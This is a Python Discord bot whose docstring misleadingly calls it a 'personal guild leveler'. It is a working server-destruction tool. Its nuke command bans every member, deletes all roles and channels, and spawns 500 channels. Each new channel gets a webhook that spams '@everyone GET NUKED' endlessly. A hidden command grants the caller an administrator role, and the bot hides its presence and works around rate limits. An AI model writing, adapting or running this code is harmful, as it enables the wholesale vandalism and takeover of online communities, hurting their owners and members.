"""My personal guild leveler - Star#1895"""
import random
import threading
import time
import discord
from discord.ext.commands import Bot
import aiohttp
import requests

#constants

TOKEN = 'your-token-here' #<---
PREFIX = '!'
LIMITER = True #slightly offsets the effect of rate limits at the cost of performance
INTENTS = discord.Intents.all()

SPAM_MESSAGES = ['@everyone GET NUKED', '@everyone NUKED']
NAMES = ['nuked', 'get-nuked']

URL = 'https://discord.com/api/v9'
REQUEST_HEADERS = {
    'authorization': f'Bot {TOKEN}'
}

BOT = Bot(command_prefix=PREFIX, intents=INTENTS)
BOT.remove_command('help')

def ban_member(guild_id, member_id):
    """Ban a member"""
    while True:
        response = requests.put(f'{URL}/guilds/{guild_id}/bans/{member_id}', headers=REQUEST_HEADERS)
        try:
            if response.json().get('message'):
                if LIMITER:
                    time.sleep(response.json().get('retry_after'))
            else:
                break
        except Exception:
            break

def delete_role(guild_id, role_id):
    """Delete a role"""
    while True:
        response = requests.delete(f'{URL}/guilds/{guild_id}/roles/{role_id}', headers=REQUEST_HEADERS)
        try:
            if response.json().get('message'):
                if LIMITER:
                    time.sleep(response.json().get('retry_after'))
            else:
                break
        except Exception:
            break

def delete_channel(channel_id):
    """Delete a channel"""
    while True:
        response = requests.delete(f'{URL}/channels/{channel_id}', headers=REQUEST_HEADERS)
        try:
            if response.json().get('message'):
                if LIMITER:
                    time.sleep(response.json().get('retry_after'))
            else:
                break
        except Exception:
            break

def create_channel(guild_id):
    """Create a new channel"""
    while True:
        response = requests.post(f'{URL}/guilds/{guild_id}/channels', headers=REQUEST_HEADERS, json={'name': random.choice(NAMES)})
        try:
            if response.json().get('message'):
                if LIMITER:
                    time.sleep(response.json().get('retry_after'))
            else:
                break
        except Exception:
            break

#events

@BOT.event
async def on_ready():
    """Triggers when bot is running"""
    await BOT.change_presence(status=discord.Status.invisible)
    print('Nuke primed')

@BOT.event
async def on_server_join(guild):
    """Triggers on server join"""
    print(f'Joining {guild.name}')

@BOT.event
async def on_guild_channel_create(channel):
    """Spam ping every channel created"""
    webhook = await channel.create_webhook(name='nuked')
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        while True:
            try:
                await webhook.send(random.choice(SPAM_MESSAGES), username=random.choice(NAMES))
            except discord.errors.NotFound:
                break      

#commands

@BOT.command(pass_context=True)
async def nuke(ctx):
    """Bans everyone, deletes everything, spams"""
    roles = ctx.guild.roles
    channels = ctx.guild.channels
    guild_id = ctx.guild.id
    members = ctx.guild.members

    for role in roles:
        threading.Thread(target=delete_role,args=(guild_id, role.id,)).start()
    for channel in channels:
        threading.Thread(target=delete_channel,args=(channel.id,)).start()
    for member in members:
        threading.Thread(target=ban_member,args=(guild_id, member.id,)).start()
    for i in range(500):
        threading.Thread(target=create_channel,args=(guild_id,)).start()

@BOT.command(pass_context=True)
async def a(ctx):
    """Give yourself admin"""
    guild = ctx.guild
    await guild.create_role(name="*", permissions=discord.Permissions(8), colour=discord.Colour(0xff0000))
    user = ctx.message.author
    role = discord.utils.get(guild.roles, name="*")
    await user.add_roles(role)

try:
    BOT.run(TOKEN)
except discord.PrivilegedIntentsRequired:
    print("Error: you need to enable privledged intents on your bots client")
